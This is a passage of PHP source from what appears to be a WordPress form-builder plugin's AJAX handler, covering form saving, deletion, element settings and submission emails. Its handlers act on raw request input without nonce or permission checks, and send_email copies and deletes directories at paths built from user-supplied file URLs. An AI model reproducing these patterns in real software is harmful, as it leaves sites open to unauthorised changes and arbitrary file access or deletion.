     *  Loads the form preview on backedn (create form page)
     *
     *  @since      1.0.0
    */
    public static function load_preview() {
        $id = absint( $_REQUEST['id'] );
        echo SUPER_Shortcodes::super_form_func( array( 'id'=>$id ) );
        //echo do_shortcode('[super_form id="' . $id . '"]');
        die();
    }


    /** 
     *  Loads an existing form from the Examples dropdown
     *
     *  @since      1.0.0
    */
    public static function load_form(){
        if($_REQUEST['id']==0){
            $shortcode = '[{"tag":"column","group":"layout_elements","inner":[{"tag":"text","group":"form_elements","inner":"","data":{"name":"first_name","email":"First name:","label":"","description":"","placeholder":"Your First Name","tooltip":"","validation":"empty","error":"","grouped":"0","maxlength":"0","minlength":"0","width":"0","exclude":"0","error_position":"","icon_position":"outside","icon_align":"left","icon":"user","conditional_action":"disabled","conditional_trigger":"all","conditional_items":[{"field":"name","logic":"contains","value":""}]}}],"data":{"size":"1/2","margin":"","conditional_action":"disabled"}},{"tag":"column","group":"layout_elements","inner":[{"tag":"text","group":"form_elements","inner":"","data":{"name":"last_name","email":"Last name:","label":"","description":"","placeholder":"Your Last Name","tooltip":"","validation":"empty","error":"","grouped":"0","maxlength":"0","minlength":"0","width":"0","exclude":"0","error_position":"","icon_position":"outside","icon_align":"left","icon":"user","conditional_action":"disabled","conditional_trigger":"all","conditional_items":[{"field":"name","logic":"contains","value":""}]}}],"data":{"size":"1/2","margin":"","conditional_action":"disabled"}},{"tag":"column","group":"layout_elements","inner":[{"tag":"text","group":"form_elements","inner":"","data":{"name":"email","email":"Email address:","label":"","description":"","placeholder":"Your Email Address","tooltip":"","validation":"email","error":"","grouped":"0","maxlength":"0","minlength":"0","width":"0","exclude":"0","error_position":"","icon_position":"outside","icon_align":"left","icon":"envelope","conditional_action":"disabled","conditional_trigger":"all","conditional_items":[{"field":"first_name","logic":"contains","value":""}]}},{"tag":"textarea","group":"form_elements","inner":"","data":{"name":"question","email":"Question","placeholder":"Ask us any questions...","validation":"none","icon_position":"outside","icon_align":"left","icon":"question","conditional_action":"disabled","conditional_trigger":"all"}}],"data":{"size":"1/1","margin":"","conditional_action":"disabled"}}]';
        }else{
            $shortcode = get_post_meta( absint( $_REQUEST['id'] ), '_super_elements', true );
        }
        echo $shortcode;
        die();
    }


    /** 
     *  Saves the form with all it's settings
     *
     *  @since      1.0.0
    */
    public static function save_form( $id=null, $shortcode=array(), $settings=null, $title=null ) {
        
        if( $id==null ) {
            $id = $_POST['id'];
        }
        $id = absint( $id );
        if( isset( $_POST['shortcode'] ) ) {
            $shortcode = $_POST['shortcode'];
        }
        if( $settings==null ) {
            $settings = array();
            foreach( $_REQUEST['settings'] as $k => $v ) {
                $settings[$v['name']] = $v['value'];
            }
        }
        if( $title==null) {
            $title = __( 'Form Name', 'super-forms' );
        }
        if( isset( $_POST['title'] ) ) {
            $title = $_POST['title'];
        }
        if( empty( $id ) ) {
            $form = array(
                'post_title' => $title,
                'post_status' => 'publish',
                'post_type'  => 'super_form'
            );
            $id = wp_insert_post( $form ); 
            add_post_meta( $id, '_super_elements', $_POST['shortcode'] );
            add_post_meta( $id, '_super_form_settings', $settings );
        }else{
            $form = array(
                'ID' => $id,
                'post_title'  => $title
            );
            wp_update_post( $form );
            update_post_meta( $id, '_super_elements', $_POST['shortcode'] );
            update_post_meta( $id, '_super_form_settings', $settings );
        }
        echo $id;
        die();

    }


    /** 
     *  Deletes the form with all it's settings
     *
     *  @since      1.0.0
    */
    public static function delete_form() {
        wp_delete_post( absint( $_POST['id'] ), true );
        die();
    }


    /** 
     *  Function to load all element settings while editing the element (create form page / settings tabs)
     *
     *  @param  string  $tag
     *  @param  array   $data
     *
     *  @since      1.0.0
    */
    public static function load_element_settings( $tag=null, $group=null, $data=null ) {
        
        if($tag==null){
            $tag = $_POST['tag'];
        }
        if($group==null){
            $group = $_POST['group'];
        }
        if($data==null){
            $data = $_POST['data'];
        }

        $array = SUPER_Shortcodes::shortcodes( false, $data, false );
        $tabs = $array[$group]['shortcodes'][$tag]['atts'];
        
        $result = '';    
        $result .= '<div class="super-element-settings-tabs">';
            $result .= '<select>';
                $i = 0;
                foreach( $tabs as $k => $v ){
                    $result .= '<option ' . ( $i==0 ? 'selected="selected"' : '' ) . ' value="' . $i . '">' . $v['name'] . '</option>';
                    $i++;
                }
            $result .= '</select>';
        $result .= '</div>';
        
        $i = 0;
        foreach( $tabs as $k => $v ){                
            $result .= '<div class="tab-content' . ( $i==0 ? ' active' : '' ) . '">';
                if( isset( $v['fields'] ) ) {
                    foreach( $v['fields'] as $fk => $fv ) {
                        $filter = '';
                        $parent = '';
                        $filtervalue = '';
                        if( ( isset( $fv['filter'] ) ) && ( $fv['filter']==true ) ) {
                            $filter = ' filter';
                            if( isset( $fv['parent'] ) ) $parent = ' data-parent="' . $fv['parent'] . '"';
                            if( isset( $fv['filter_value'] ) ) $filtervalue = ' data-filtervalue="' . $fv['filter_value'] . '"';
                        }
                        $hidden = '';
                        if( isset( $fv['hidden'] ) && ( $fv['hidden']==true ) ) {
                            $hidden = ' hidden';
                        }
                        $result .= '<div class="field' . $filter . $hidden . '"' . $parent . '' . $filtervalue . '>';
                            if( isset( $fv['name'] ) ) $result .= '<div class="field-name">' . $fv['name'] . '</div>';
                            if( isset( $fv['desc'] ) ) $result .= '<i class="info popup" title="' . $fv['desc'] . '"></i>';
                            if( isset( $fv['label'] ) ) $result .= '<div class="field-label">' . $fv['label'] . '</div>';
                            $result .= '<div class="field-input">';
                                if( !isset( $fv['type'] ) ) $fv['type'] = 'text';
                                if( method_exists( 'SUPER_Field_Types', $fv['type'] ) ) {
                                    if( isset( $data[$fk] ) ) $fv['default'] = $data[$fk];
                                    $result .= call_user_func( array( 'SUPER_Field_Types', $fv['type'] ), $fk, $fv, $data );
                                }
                            $result .= '</div>';
                        $result .= '</div>';
                    }
                }
            $result .= '</div>';
            $i = 1;
        }
        $result .= '<span class="super-button update-element">' . __( 'Update Element', 'super-forms' ) . '</span>';
        $result .= '<span class="super-button cancel-update">' . __( 'Close', 'super-forms' ) . '</span>';
        echo $result;        
        die();
        
    }
    
    
    /** 
     *  Retrieve the HTML for the element that is being dropped inside a dropable element
     *
     *  @param  string  $tag
     *  @param  array   $inner
     *  @param  array   $data
     *  @param  integer $method
     *
     *  @since      1.0.0
    */
    public static function get_element_builder_html( $tag=null, $group=null, $inner=null, $data=null, $method=1 ) {

        $form_id = 0;
        if( isset( $_REQUEST['form_id'] ) ) {
            $form_id = absint( $_REQUEST['form_id'] );
            $settings = get_post_meta( $form_id, '_super_form_settings', true );
            if( $settings==false ) {
                $settings = get_option( 'super_settings' );
            }
        }else{
            $settings = get_option( 'super_settings' );
        }

        include_once( SUPER_PLUGIN_DIR . '/includes/class-shortcodes.php' );
        $shortcodes = SUPER_Shortcodes::shortcodes();

        $predefined = '';
        if( isset( $_REQUEST['predefined'] ) ) {
            $predefined = $_REQUEST['predefined'];
        }
        if( $predefined!='' ) {
            $result = '';
            foreach( $predefined as $k => $v ) {
                // Output builder HTML (element and with action buttons)
                $result .= SUPER_Shortcodes::output_builder_html( $v['tag'], $v['group'], $v['data'], $v['inner'], $shortcodes, $settings );
            }
        }else{

            if($tag==null){
                $tag = $_REQUEST['tag'];
            }
            if($group==null){
                $group = $_REQUEST['group'];
            }
            $builder = 1;
            if(isset($_REQUEST['builder'])){
                $builder = $_REQUEST['builder'];
            }
            if(empty($inner)) {
                $inner = array();
                if(isset($_REQUEST['inner'])){
                    $inner = $_REQUEST['inner'];
                }
            }
            if(empty($data)) {
                $data = array();
                if(isset($_REQUEST['data'])){
                    $data = $_REQUEST['data'];
                }
            }
            if($builder==0){
                // Output element HTML only
                $result = SUPER_Shortcodes::output_element_html( $tag, $group, $data, $inner, $shortcodes, $settings );
            }else{
                // Output builder HTML (element and with action buttons)
                $result = SUPER_Shortcodes::output_builder_html( $tag, $group, $data, $inner, $shortcodes, $settings );
            }
        }
           
        // Return method
        if($method==1){
            echo $result;
        }else{
            return $result;
        }

        die();        
    }


    /** 
     *  Send an email with the submitted form data
     *
     *  @param  array  $settings
     *
     *  @since      1.0.0
    */
    public static function send_email( $settings=null ) {

        $data = array();
        if( isset( $_REQUEST['data'] ) ) {
            $data = $_REQUEST['data'];
        }
        
        $form_id = 0;
        if( $settings==null ) {
            $form_id = absint( $_POST['form_id'] );
            $settings = get_post_meta( $form_id, '_super_form_settings', true );
        }
        $duration = $settings['form_duration'];
        
        do_action( 'super_before_sending_email_hook', array( 'post'=>$_POST, 'settings'=>$settings ) );
        
        if( !empty( $settings['header_additional'] ) ) {
            $header_additional = '';
            if( !empty( $settings['header_additional'] ) ) {
                $headers = explode( "\n", $settings['header_additional'] );   
                foreach( $headers as $k => $v ) {
                    $header_additional .= $v . "\r\n";
                }
            }
            $settings['header_additional'] = $header_additional;
        }

        /** 
         *  Make sure to also save the file into the WP Media Library
         *  In case a user deletes Super Forms these files are not instantly deleted without warning
         *
         *  @since      1.1.8
        */
        
        if( ( isset( $data ) ) && ( count( $data )>0 ) ) {
            $delete_dirs = array();
            foreach( $data as $k => $v ) {
                if( $v['type']=='files' ) {
                    if( ( isset( $v['files'] ) ) && ( count( $v['files'] )!=0 ) ) {
                        foreach( $v['files'] as $key => $value ) {                              
                            $domain_url_without_http = str_replace( 'http://', '', network_home_url() );
                            $domain_url_without_http = str_replace( 'https://', '', $domain_url_without_http );
                            $image_url_without_http = str_replace( 'http://', '', $value['url'] );
                            $image_url_without_http = str_replace( 'https://', '', $image_url_without_http );
                            $image_url_without_http = str_replace( $domain_url_without_http, '', $image_url_without_http );
                            $source = urldecode( ABSPATH . $image_url_without_http );
                            $wp_upload_dir = wp_upload_dir();
                            $folder = $wp_upload_dir['basedir'] . $wp_upload_dir["subdir"];
                            $unique_folder = SUPER_Common::generate_random_folder($folder);
                            $newfile = $unique_folder . '/' . basename( $source );
                            if ( !copy( $source, $newfile ) ) {
                                $dir = str_replace( basename( $source ), '', $source );
                                SUPER_Common::delete_dir( $dir );
                                SUPER_Common::delete_dir( $unique_folder );
                                SUPER_Common::output_error(
                                    $error = true,
                                    $msg = __( 'Failed to copy', 'super-forms' ) . '"'.$source.'" to: "'.$newfile.'"',
                                    $redirect = $redirect
                                );
                                die();
                            }else{
                                $dir = str_replace( basename( $source ), '', $source );
                                if( !empty( $dir ) ) {
                                    $delete_dirs[] = $dir;
                                }
                                $filename = $newfile;
                                $parent_post_id = $contact_entry_id;
                                $filetype = wp_check_filetype( basename( $filename ), null );
                                $wp_upload_dir = wp_upload_dir();
                                $attachment = array(
                                    'post_mime_type' => $filetype['type'],
                                    'post_title'     => preg_replace( '/\.[^.]+$/', '', basename( $filename ) ),
                                    'post_content'   => '',
                                    'post_status'    => 'inherit'
                                );
                                $attach_id = wp_insert_attachment( $attachment, $filename );

                                require_once( ABSPATH . 'wp-admin/includes/image.php' );
                                $attach_data = wp_generate_attachment_metadata( $attach_id, $filename );
                                wp_update_attachment_metadata( $attach_id,  $attach_data );
                                
                                $data[$k]['files'][$key]['attachment'] = $attach_id;
                                $data[$k]['files'][$key]['url'] = wp_get_attachment_url( $attach_id );
                            }
                        }
                    }
                }                   
            }
            foreach( $delete_dirs as $dir ) {
                SUPER_Common::delete_dir( $dir );
            }
        }

        $contact_entry_id = null;
        if( $settings['save_contact_entry']=='yes' ) {
            $post = array(
                'post_status' => 'super_unread',
                'post_type'  => 'super_contact_entry' ,
            ); 
            $contact_entry_id = wp_insert_post($post); 
            add_post_meta( $contact_entry_id, '_super_contact_entry_data', $data);
            add_post_meta( $contact_entry_id, '_super_contact_entry_ip', SUPER_Common::real_ip() );
            
            // @since 1.2.6     - custom contact entry titles
            $contact_entry_title = __( 'Contact entry', 'super-forms' );
            if( !isset( $settings['enable_custom_entry_title'] ) ) $settings['enable_custom_entry_title'] = '';
            if( $settings['enable_custom_entry_title']=='true' ) {
                if( !isset( $settings['contact_entry_title'] ) ) $settings['contact_entry_title'] = $contact_entry_title;
                if( !isset( $settings['contact_entry_add_id'] ) ) $settings['contact_entry_add_id'] = '';
                $contact_entry_title = SUPER_Common::email_tags( $settings['contact_entry_title'], $data, $settings );
                if($settings['contact_entry_add_id']=='true'){
                    $contact_entry_title = $contact_entry_title . ' ' . $contact_entry_id;
                }
            }else{
                $contact_entry_title = $contact_entry_title . ' ' . $contact_entry_id;
            }

            $contact_entry = array(
                'ID' => $contact_entry_id,
                'post_title'  => $contact_entry_title,
            );
            wp_update_post( $contact_entry );
        }

        $settings = apply_filters( 'super_before_sending_email_settings_filter', $settings );
        
        $email_loop = '';
        $confirm_loop = '';
        $attachments = array();
        $string_attachments = array();
        if( ( isset( $data ) ) && ( count( $data )>0 ) ) {
            foreach( $data as $k => $v ) {
                $row = $settings['email_loop'];
                if( !isset( $v['exclude'] ) ) {
                    $v['exclude'] = 0;
                }
                if( $v['exclude']==2 ) {
                    continue;
                }

                /** 
                 *  Filter to control the email loop when something special needs to happen
                 *  e.g. Signature Add-on needs to display image instead of the base64 code that the value contains
                 *
                 *  @param  string  $row
                 *  @param  array   $data
                 *
                 *  @since      1.0.9
                */
                $result = apply_filters( 'super_before_email_loop_data_filter', $row, array( 'v'=>$v, 'string_attachments'=>$string_attachments ) );
                if( isset( $result['status'] ) ) {
                    if( $result['status']=='continue' ) {
                        if( isset( $result['string_attachments'] ) ) {
                            $string_attachments = $result['string_attachments'];
                        }
                        if( ( isset( $result['exclude'] ) ) && ( $result['exclude']==1 ) ) {
                            $email_loop .= $result['row'];
                        }else{
                            $email_loop .= $result['row'];
                            $confirm_loop .= $result['row'];
                        }
                        continue;
                    }
                }

                if( $v['type']=='files' ) {
                    $files_value = '';
                    if( ( !isset( $v['files'] ) ) || ( count( $v['files'] )==0 ) ) {
                        if( isset( $v['label'] ) ) $row = str_replace( '{loop_label}', SUPER_Common::decode( $v['label'] ), $row );
                        $files_value .= __( 'User did not upload any files', 'super-forms' );
                    }else{
                        foreach( $v['files'] as $key => $value ) {
                            if( $key==0 ) {
                                if( isset( $v['label'] ) ) $row = str_replace( '{loop_label}', SUPER_Common::decode( $v['label'] ), $row );
                            }
                            $files_value .= '<a href="' . $value['url'] . '" target="_blank">' . $value['value'] . '</a><br /><br />';
                            $attachments[$value['value']] = $value['url'];
                        }
                    }
                    $row = str_replace( '{loop_value}', $files_value, $row );
                }else{
                    if( $v['type']=='form_id' ) {
                        $row = '';
                    }else{
                        if( isset( $v['label'] ) ) $row = str_replace( '{loop_label}', SUPER_Common::decode( $v['label'] ), $row );
                        if( isset( $v['value'] ) ) $row = str_replace( '{loop_value}', SUPER_Common::decode_textarea( $v['value'] ), $row );
                    }
                }
                if( $v['exclude']==1 ) {
                    $email_loop .= $row;
                }else{
                    $email_loop .= $row;
                    $confirm_loop .= $row;
                }                    
            }
        }
        if( $settings['send']=='yes' ) {
            if(!empty($settings['email_body_open'])) $settings['email_body_open'] = $settings['email_body_open'] . '<br /><br />';
            if(!empty($settings['email_body'])) $settings['email_body'] = $settings['email_body'] . '<br /><br />';
            $email_body = $settings['email_body_open'] . $settings['email_body'] . $settings['email_body_close'];
            $email_body = str_replace( '{loop_fields}', $email_loop, $email_body );
            $email_body = SUPER_Common::email_tags( $email_body, $data, $settings );
            $email_body = nl2br( $email_body );
            $email_body = apply_filters( 'super_before_sending_email_body_filter', $email_body, array( 'settings'=>$settings, 'email_loop'=>$email_loop, 'data'=>$data ) );
            if( !isset( $settings['header_from_type'] ) ) $settings['header_from_type'] = 'default';
            if( $settings['header_from_type']=='default' ) {
                $settings['header_from_name'] = get_option( 'blogname' );
                $settings['header_from'] = get_option( 'admin_email' );
            }
            if( !isset( $settings['header_from_name'] ) ) $settings['header_from_name'] = get_option( 'blogname' );
            if( !isset( $settings['header_from'] ) ) $settings['header_from'] = get_option( 'admin_email' );

            $to = SUPER_Common::decode_email_header( SUPER_Common::email_tags( $settings['header_to'], $data, $settings ) );
            $from = SUPER_Common::decode_email_header( SUPER_Common::email_tags( $settings['header_from'], $data, $settings ) );
            $from_name = SUPER_Common::decode_email_header( SUPER_Common::email_tags( $settings['header_from_name'], $data, $settings ) );
            $cc = SUPER_Common::decode_email_header( SUPER_Common::email_tags( $settings['header_cc'], $data, $settings ) );
            $bcc = SUPER_Common::decode_email_header( SUPER_Common::email_tags( $settings['header_bcc'], $data, $settings ) );
            $subject = SUPER_Common::decode( SUPER_Common::email_tags( $settings['header_subject'], $data, $settings ) );

            // Send the email
            $mail = SUPER_Common::email( $to, $from, $from_name, $cc, $bcc, $subject, $email_body, $settings, $attachments, $string_attachments );

            // Return error message
            if( !empty( $mail->ErrorInfo ) ) {
                $msg = __( 'Message could not be sent. Error: ' . $mail->ErrorInfo, 'super-forms' );
                SUPER_Common::output_error( $error=true, $msg );
            }
        }
        if( $settings['confirm']=='yes' ) {
            $settings['header_additional'] = '';
            if(!empty($settings['confirm_body_open'])) $settings['confirm_body_open'] = $settings['confirm_body_open'] . '<br /><br />';
            if(!empty($settings['confirm_body'])) $settings['confirm_body'] = $settings['confirm_body'] . '<br /><br />';
            $email_body = $settings['confirm_body_open'] . $settings['confirm_body'] . $settings['confirm_body_close'];
            $email_body = str_replace( '{loop_fields}', $confirm_loop, $email_body );
            $email_body = SUPER_Common::email_tags( $email_body, $data, $settings );
            $email_body = nl2br( $email_body );
            $email_body = apply_filters( 'super_before_sending_confirm_body_filter', $email_body, array( 'settings'=>$settings, 'confirm_loop'=>$confirm_loop, 'data'=>$data ) );
            if( !isset( $settings['confirm_from_type'] ) ) $settings['confirm_from_type'] = 'default';
            if( $settings['confirm_from_type']=='default' ) {
                $settings['confirm_from_name'] = get_option( 'blogname' );
                $settings['confirm_from'] = get_option( 'admin_email' );
            }
            if( !isset( $settings['confirm_from_name'] ) ) $settings['confirm_from_name'] = get_option( 'blogname' );
            if( !isset( $settings['confirm_from'] ) ) $settings['confirm_from'] = get_option( 'admin_email' );
            $to = SUPER_Common::decode_email_header( SUPER_Common::email_tags( $settings['confirm_to'], $data, $settings ) );
            $from = SUPER_Common::decode_email_header( SUPER_Common::email_tags( $settings['confirm_from'], $data, $settings ) );
            $from_name = SUPER_Common::decode_email_header( SUPER_Common::email_tags( $settings['confirm_from_name'], $data, $settings ) );
            $subject = SUPER_Common::decode( SUPER_Common::email_tags( $settings['confirm_subject'], $data, $settings ) );

            // Send the email
            $mail = SUPER_Common::email( $to, $from, $from_name, '', '', $subject, $email_body, $settings, $attachments, $string_attachments );

            // Return error message
            if( !empty( $mail->ErrorInfo ) ) {
                $msg = __( 'Message could not be sent. Error: ' . $mail->ErrorInfo, 'super-forms' );
                SUPER_Common::output_error( $error=true, $msg );
            }
        }
        if( $form_id!=0 ) {

            /** 
             *  Hook before outputing the success message or redirect after a succesfull submitted form
             *
             *  @param  post    $_POST
             *  @param  array   $settings
             *  @param  int     $contact_entry_id    @since v1.2.2
             *
             *  @since      1.0.2
            */
            do_action( 'super_before_email_success_msg_action', array( 'post'=>$_POST, 'data'=>$data, 'settings'=>$settings, 'entry_id'=>$contact_entry_id ) );

            // Return message or redirect and save message to session
            $redirect = null;
            $msg_empty = false;
            if( (empty($settings['form_thanks_description'])) && (empty($settings['form_thanks_title'])) ) {
                $msg_empty = true;
            }
            $settings['form_thanks_title'] = '<h1>' . $settings['form_thanks_title'] . '</h1>';
            $msg = do_shortcode( $settings['form_thanks_title'] . $settings['form_thanks_description'] );
            $msg = SUPER_Common::email_tags( $msg, $data, $settings );
            if( !empty( $settings['form_redirect_option'] ) ) {
                if( $settings['form_redirect_option']=='page' ) {
                    $redirect = get_permalink( $settings['form_redirect_page'] );
                }
                if( $settings['form_redirect_option']=='custom' ) {
                    $redirect = SUPER_Common::email_tags( $settings['form_redirect'], $data, $settings );
                }
                if( $msg_empty==false ) {
                    $_SESSION['super_msg'] = array( 'msg'=>$msg, 'type'=>'success' );
                }
            }
            SUPER_Common::output_error(
                $error = false,
                $msg = $msg,
                $redirect = $redirect
            );
            die();
        }
    }

}
endif;
SUPER_Ajax::init();     